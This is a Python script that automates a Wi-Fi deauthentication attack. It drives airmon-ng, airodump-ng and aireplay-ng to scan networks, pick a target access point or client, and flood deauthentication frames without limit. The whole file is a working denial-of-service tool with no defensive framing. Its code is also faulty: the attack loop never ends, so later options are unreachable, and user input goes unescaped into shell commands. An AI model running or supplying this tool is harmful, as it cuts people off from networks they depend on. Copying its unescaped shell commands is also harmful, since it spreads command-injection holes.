import os
import signal
import sys
import time

# Global variable to track the attack state
attack_paused = False

# Function to stop deauthentication and restore wireless interface
def stop_deauth(signal, frame, interface):
    print(f"\nDeauthentication stopped. Restoring wireless interface {interface}...")
    os.system(f"sudo airmon-ng stop {interface} > /dev/null 2>&1")
    os.system("sudo service NetworkManager restart")
    print("Goodbye.")
    sys.exit(0)

# Function to handle SIGINT (Ctrl+C) for pausing/resuming the attack
def pause_resume_attack(signal, frame):
    global attack_paused
    if attack_paused:
        print("\nAttack resumed.")
        attack_paused = False
    else:
        print("\nAttack paused. Press Ctrl+C again to resume or (n) for a new target.")
        attack_paused = True
        while True:
            user_input = input("Options: (c)ontinue attack, (n)ew target, (q)uit: ").lower()
            if user_input == 'c':
                attack_paused = False
                print("Attack resumed.")
                break
            elif user_input == 'n':
                restart_scanning()
                break
            elif user_input == 'q':
                stop_deauth(None, None, interface_choice)
            else:
                print("Invalid input. Try again.")

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, pause_resume_attack)

# Function to prompt the user to continue or target another device
def continue_or_target():
    return input("\nDo you want to continue the attack, target another device, restart scanning, or quit? (c/n/r/q): ").lower()

# Function to restart the scanning process
def restart_scanning():
    global bssid
    print("\nRestarting scanning process...")
    bssid = input("Enter the BSSID of the access point (or type 'q' to quit): ")
    if bssid.lower() == 'q':
        stop_deauth(None, None, interface_choice)  # Immediately exit the script
    channel = input(f"Enter the channel for {monitor_interface} (e.g., 1, 6, 11): ")
    os.system(f"sudo iwconfig {monitor_interface} channel {channel}")

# Prompt the user to choose a wireless interface
interface_choice = input("Choose a wireless interface (wlan0/wlan1): ").lower()

# Set the chosen wireless interface to monitor mode or use directly
os.system(f"sudo airmon-ng check kill > /dev/null 2>&1")

if interface_choice == "wlan0":
    os.system("sudo airmon-ng start wlan0 > /dev/null 2>&1")
    monitor_interface = "wlan0mon"
else:
    os.system("sudo airmon-ng start wlan1 > /dev/null 2>&1")
    monitor_interface = "wlan1"

while True:
    # Scan for both 2.4GHz and 5GHz wireless networks on the monitor interface
    os.system(f"sudo airodump-ng -b abg {monitor_interface}")

    # Prompt the user to choose a network
    bssid = input("Enter the BSSID of the access point (or type 'q' to quit): ")
    if bssid.lower() == 'q':
        stop_deauth(None, None, interface_choice)  # Immediately exit the script

    # Prompt the user to choose a channel for the monitor interface
    channel = input(f"Enter the channel for {monitor_interface} (e.g., 1, 6, 11): ")
    os.system(f"sudo iwconfig {monitor_interface} channel {channel}")

    while True:
        # Prompt the user to choose between deauthenticating a client only or the whole network
        choice = input("Do you want to deauthenticate a client only? (y/n): ")
        if choice.lower() == "y":
            client = input("Enter the MAC address of the client: ")
            command = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {monitor_interface}"
        else:
            command = f"sudo aireplay-ng -0 0 -a {bssid} {monitor_interface}"

        # Execute the attack command
        print("Starting deauthentication attack. Press Ctrl+C to pause/resume or (n) for a new target.")
        start_time = time.time()
        while True:
            if not attack_paused:
                os.system(command)
                time.sleep(1)  # Sleep for a second to allow pausing and resuming

        # Prompt the user to continue or target another device, restart scanning, or quit
        user_input = continue_or_target()
        if user_input == 'q':
            stop_deauth(None, None, interface_choice)
        elif user_input == 'c':
            # Continue the attack with the same target, ask for a new attack duration
            break
        elif user_input == 'n':
            # Target a new device, restart scanning process
            restart_scanning()
            break
        elif user_input == 'r':
            # Restart scanning without changing the target
            break
        else:
            print("Invalid input. Exiting.")
            stop_deauth(None, None, interface_choice)
